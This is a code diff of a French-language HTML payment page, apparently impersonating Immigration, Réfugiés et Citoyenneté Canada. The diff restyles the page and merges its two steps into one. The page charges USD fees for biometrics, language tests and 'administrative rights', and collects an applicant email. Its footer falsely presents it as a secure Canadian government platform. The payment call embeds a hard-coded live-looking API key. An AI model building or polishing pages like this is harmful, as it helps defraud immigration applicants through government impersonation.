@@ -6,43 +6,47 @@
 <title>Paiement immigration Canada Service</title>
 
 <style>
-body{
-  font-family:Arial;
-  background:
-    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
-    url("background.jpg") no-repeat center;
-  background-size:cover;
-
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-
-  min-height:100vh;
-  margin:0;
+html, body {
+  height: 100%;
+  margin: 0;
+  padding: 0;
 }
 
-.box{
-  background:white;
-  padding:30px;
-  border-radius:12px;
-  width:350px;
-  text-align:center;
-  box-shadow:0 0 15px rgba(0,0,0,0.2);
-  margin-bottom:20px;
+body {
+  font-family: Arial, sans-serif;
+  background: linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)), url("background.jpg") no-repeat center center fixed;
+  background-size: cover;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
 }
 
-.logo{
-  width:120px;
-  margin-bottom:10px;
+.box {
+  background: white;
+  padding: 30px;
+  border-radius: 12px;
+  width: 90%;
+  max-width: 350px;
+  text-align: center;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+  margin-top: auto;
+  margin-bottom: auto;
+  box-sizing: border-box;
 }
 
-select,button,input{
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:6px;
-  border:1px solid #ccc;
+.logo {
+  width: 120px;
+  margin-bottom: 10px;
+}
+
+select, button, input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
   box-sizing: border-box;
 }
 
@@ -51,31 +55,23 @@ input:focus, select:focus {
   outline: none;
 }
 
-button{
-  background:#00bcd4;
-  color:white;
-  border:none;
-  font-weight:bold;
-  cursor:pointer;
+button {
+  background: #00bcd4;
+  color: white;
+  border: none;
+  font-weight: bold;
+  cursor: pointer;
 }
 
-button:hover{
-  background:#0097a7;
+button:hover {
+  background: #0097a7;
 }
 
-.btn-secondary {
-  background: #777;
-  margin-top: 10px;
-}
-
-.btn-secondary:hover {
-  background: #555;
-}
-
-#amount{
-  margin-top:10px;
-  font-weight:bold;
-  color:#333;
+#amount {
+  margin-top: 14px;
+  font-weight: bold;
+  color: #333;
+  font-size: 16px;
 }
 
 .form-group {
@@ -103,23 +99,24 @@ button:hover{
   border-radius: 4px;
 }
 
-.footer{
-  text-align:center;
-  color:white;
-  font-size:12px;
+.footer {
+  text-align: center;
+  color: white;
+  font-size: 12px;
+  margin-bottom: 20px;
+  width: 100%;
+  max-width: 350px;
 }
 
-.footer img{
-  width:35px;
-  margin-top:5px;
+.footer p {
+  margin: 5px 0;
 }
 
-.step {
-  display: none;
-}
-
-.step.active {
-  display: block;
+.footer img {
+  width: 40px;
+  height: auto;
+  margin-top: 8px;
+  display: inline-block;
 }
 </style>
 
@@ -135,81 +132,59 @@ button:hover{
 
 <h3>Paiement immigration Canada Service</h3>
 
-<!-- ÉTAPE 1 : SERVICE ET ADRESSE E-MAIL -->
-<div id="step1" class="step active">
-  <div class="form-group">
-    <label for="service">Sélectionnez le service administratif</label>
-    <select id="service" onchange="updateAmount()">
-      <option value="85">1 - Demande biométrique - 85 USD</option>
-      <option value="150">2 - Test de langue - 150 USD</option>
-      <option value="220">3 - Droit administratif - 220 USD</option>
-      <option value="455">4 - Toutes les procédures - 455 USD</option>
-    </select>
-  </div>
-
-  <div class="form-group">
-    <label for="email">Adresse e-mail du candidat</label>
-    <input type="email" id="email" placeholder="exemple@domaine.com" required>
-  </div>
-
-  <div class="info-notice">
-    <strong>📍 Note importante :</strong> Votre date de rendez-vous définitive vous sera communiquée par cette adresse e-mail. Un récépissé officiel de prise de rendez-vous vous y sera envoyé. Le candidat devra impérativement se rendre à l'ambassade muni de ce récépissé imprimé.
-  </div>
-
-  <button type="button" onclick="validerEtape1()">Continuer</button>
+<div class="form-group">
+  <label for="service">Sélectionnez le service administratif</label>
+  <select id="service" onchange="updateAmount()">
+    <option value="85">1 - Demande biométrique - 85 USD</option>
+    <option value="150">2 - Test de langue - 150 USD</option>
+    <option value="220">3 - Droit administratif - 220 USD</option>
+    <option value="455">4 - Toutes les procédures - 455 USD</option>
+  </select>
 </div>
 
-<!-- ÉTAPE 2 : CALCUL DU MONTANT ET PAIEMENT LEEKPAY -->
-<div id="step2" class="step">
-  <p id="amount"></p>
-
-  <button type="button" onclick="payer()">Payer</button>
-  <button type="button" class="btn-secondary" onclick="retourEtape1()">Retour</button>
-
-  <p style="font-size:12px; margin-top:10px;">
-  Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
-  </p>
+<div class="form-group">
+  <label for="email">Adresse e-mail du candidat</label>
+  <input type="email" id="email" placeholder="exemple@domaine.com" required>
 </div>
 
-<p style="font-size:11px; margin-top:10px;">
+<div class="info-notice">
+  <strong>📍 Note importante :</strong> Votre date de rendez-vous définitive vous sera communiquée par cette adresse e-mail. Un récépissé officiel de prise de rendez-vous vous y sera envoyé. Le candidat devra impérativement se rendre à l'ambassade muni de ce récépissé imprimé.
+</div>
+
+<p id="amount"></p>
+
+<button type="button" onclick="payer()">Payer</button>
+
+<p style="font-size:12px; margin-top:12px; color: #666;">
+Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
+</p>
+
+<p style="font-size:11px; margin-top:5px; color: #888;">
 Ce service de paiement est offert par le gouvernement canadien.
 </p>
 
 </div>
 
-<!-- SIGNATURE -->
 <div class="footer">
   <p>© 2026 Immigration, Réfugiés et Citoyenneté Canada</p>
   <p>Plateforme du gouvernement canadien • Paiement sécurisé 🔒</p>
-  <!-- URL officielle du drapeau du Canada corrigée et stable -->
-  <img src="https://githubusercontent.com" alt="Canada">
+  <!-- Appel direct de votre fichier image locale pour le drapeau -->
+  <img src="drapeau.png" alt="Canada">
 </div>
 
 <script>
-
 function updateAmount(){
   let usd = service.value;
   amount.innerText = "Montant à payer : " + usd + " USD";
 }
 
-function validerEtape1() {
+function payer(){
   const emailInput = document.getElementById('email').value.trim();
 
   if(!emailInput || !emailInput.includes('@') || emailInput.length < 5) {
     alert("Veuillez entrer une adresse e-mail valide pour recevoir votre récépissé.");
     return;
   }
-
-  document.getElementById('step1').classList.remove('active');
-  document.getElementById('step2').classList.add('active');
-}
-
-function retourEtape1() {
-  document.getElementById('step2').classList.remove('active');
-  document.getElementById('step1').classList.add('active');
-}
-
-function payer(){
 
   let usd = parseFloat(service.value);
 
@@ -218,11 +193,9 @@ function payer(){
     currency: "USD",
     apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
   });
-
 }
 
 updateAmount();
-
 </script>
 
 </body>
